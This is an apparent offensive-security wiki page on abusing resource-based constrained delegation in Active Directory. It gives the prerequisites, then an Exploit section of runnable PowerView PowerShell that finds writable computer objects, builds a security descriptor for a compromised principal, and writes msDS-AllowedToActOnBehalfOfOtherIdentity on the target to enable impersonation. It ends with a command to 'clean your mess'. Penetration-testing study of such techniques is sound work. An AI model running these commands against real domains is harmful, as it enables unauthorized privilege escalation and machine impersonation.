---
layout: default
title: Resource-based Constrained Delegation
parent: Active Directory
nav_order: 1
permalink: /ad/rbconstrained/
---

# Resource-based Constrained Delegation
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

[Constrained delegation](/ad/constrained/) can also be resource-based. Instead of putting the attribute `msDS-AllowedToDelegateTo` on the computer which is trusted for delegation, the attribute `msDS-AllowedToActOnBehalfOfOtherIdentity` is populated on the targeted computer. Contrary to [constrained delegation]((/ad/constrained/)), resource-based constrained delegation does not need *SeEnableDelegationPrivilege* (generally a Domain Admin privilege) to be configured. You still need to have *WriteProperty*, *GenericAll*, *GenericWrite* or *WriteDacl* on the target computer to modify the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute.

## Prerequisites

* Having *WriteProperty*, *GenericAll*, *GenericWrite* or *WriteDacl* rights on the target computer.
* Compromised a domain principal (user or computer) with an SPN associated.

{: .important }
> If you are not local administrator on any computer yet, you could [abuse MachineAccountQuota](/ad/quota/) to join a fake computer to the domain.

## Exploit

The first step of this attack is to modify `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on the target computer.

```powershell
# Get domain objects that have needed writes to modify msDS-AllowedToActOnBehalfOfOtherIdentity.
Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" }

# Get the SID of the principal with an SPN associated you already compromised.
Get-DomainComputer -Identity "$hostname" -Properties ObjectSid
Get-DomainUser -Identity "$samAccountName" -Properties ObjectSid

# Create a security descriptior with this SID.
$RawSecurityDescriptor = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ObjectSid)"
$RawSecurityDescriptorBinary = New-Object byte[] ($RawSecurityDescriptor.BinaryLength)
$RawSecurityDescriptor.GetBinaryForm($RawSecurityDescriptorBinary, 0)

# Set the attribute on the target computer.
Get-DomainComputer -Identity "$hostname" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $RawSecurityDescriptorBinary} -Verbose

# Verify it worked.
Get-DomainComputer -Identity "$hostname" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
```

Now you can impersonate the target computer using the principal you already compromised. To do so, you can perform [S4U2Self Abuse](/ad/s4u2self).

**Don't forget** to clean your mess!

```powershell
Get-DomainComputer -Identity "$hostname" | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity
```